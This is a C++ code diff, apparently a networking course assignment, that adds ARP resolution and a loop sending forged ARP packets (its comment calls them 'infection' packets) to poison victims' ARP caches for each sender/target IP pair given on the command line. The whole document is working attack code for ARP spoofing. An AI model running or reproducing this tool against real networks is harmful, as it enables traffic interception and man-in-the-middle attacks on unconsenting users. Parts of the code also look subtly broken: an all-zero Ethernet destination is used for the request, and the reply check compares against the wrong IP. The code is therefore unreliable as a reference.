@@ -7,6 +7,7 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "mac.h"
+#include "ip.h"
 
 
 #pragma pack(push, 1)
@@ -44,12 +45,13 @@ Mac get_my_mac_address(const char* my_interface){
 	return Mac((uint8_t*)interface_structure.ifr_hwaddr.sa_data);
 }
 
-void send_Arp(pcap_t* handle, Mac source_mac, Ip source_ip, Mac target_mac, Ip target_ip ){
-	//기본적으로 스켈레톤 코드에서 작성된 arp 코드를 가져오되, 이번 과제에서는 단순히 하나의 타겟이 아님
-	EthArpPacket packet;
 
-	packet.eth_.dmac_ = Mac(target_mac);
-	packet.eth_.smac_ = Mac(source_mac);
+Mac get_target_mac_address(pcap_t* handle, Mac source_mac, Ip source_ip, Ip target_ip ){
+	//타겟의 mac 주소를 모른다는 가정하에 접근하고, 이에 따른 응답으로 mac 주소를 배우는 구조이므로 기존의 스켈레톤 코드를 통한 함수화
+    EthArpPacket packet;
+
+	packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
+	packet.eth_.smac_ = source_mac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -57,10 +59,59 @@ void send_Arp(pcap_t* handle, Mac source_mac, Ip source_ip, Mac target_mac, Ip t
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(source_mac);
-	packet.arp_.sip_ = htonl(Ip(source_ip));
-	packet.arp_.tmac_ = Mac(target_mac);
-	packet.arp_.tip_ = htonl(Ip(target_ip));
+	packet.arp_.smac_ =source_mac;
+	packet.arp_.sip_ = htonl(source_ip);
+	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	packet.arp_.tip_ = htonl(target_ip);
+
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		return Mac("00:00:00:00:00:00");
+	}
+
+    // ARP Reply 패킷 수신
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* replyPacket;
+        res = pcap_next_ex(handle, &header, &replyPacket);
+        if (res == 0) continue; // timeout
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+
+        EthArpPacket* arpReply = (EthArpPacket*)replyPacket;
+
+        // 수신된 패킷이 ARP Reply이며, 대상 IP가 senderIp인 경우 MAC 주소 반환
+        if (ntohs(arpReply->eth_.type_) == EthHdr::Arp &&
+            ntohs(arpReply->arp_.op_) == ArpHdr::Reply &&
+            arpReply->arp_.sip_ == Ip(htonl(source_ip))) {
+            return arpReply->arp_.smac_;
+        }
+    }
+
+   return Mac("00:00:00:00:00:00"); // 실패 시 null MAC 반환
+
+}
+
+void send_Arp(pcap_t* handle, Mac source_mac, Ip source_ip, Mac target_mac, Ip target_ip ){
+	//기본적으로 스켈레톤 코드에서 작성된 arp 코드를 가져오되, 이번 과제에서는 단순히 하나의 타겟이 아님
+	EthArpPacket packet;
+
+	packet.eth_.dmac_ = target_mac;
+	packet.eth_.smac_ = source_mac;
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = source_mac;
+	packet.arp_.sip_ = htonl(source_ip);
+	packet.arp_.tmac_ = target_mac;
+	packet.arp_.tip_ = htonl(target_ip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -93,10 +144,24 @@ int main(int argc, char* argv[]) {
 	}
 
 	
-
+ 
+    Ip myIp = Ip("172.24.145.214"); // 자신의 IP 주소를 입력
 	
 
-	
+	for (int i = 2; i < argc; i += 2) {
+        Ip senderIp = Ip(argv[i]);
+        Ip targetIp = Ip(argv[i+1]);
+
+        // Sender의 MAC 주소 알아내기
+        Mac senderMac = get_target_mac_address(handle, myMac, myIp, senderIp);
+        if (senderMac.isNull()) {
+            fprintf(stderr, "Failed to get MAC address for IP: %s\n", std::string(senderIp).c_str());
+            continue;
+        }
+
+        // ARP 감염 패킷 전송
+        send_Arp(handle, myMac, targetIp, senderMac, senderIp);
+    }
 
 
 	pcap_close(handle);
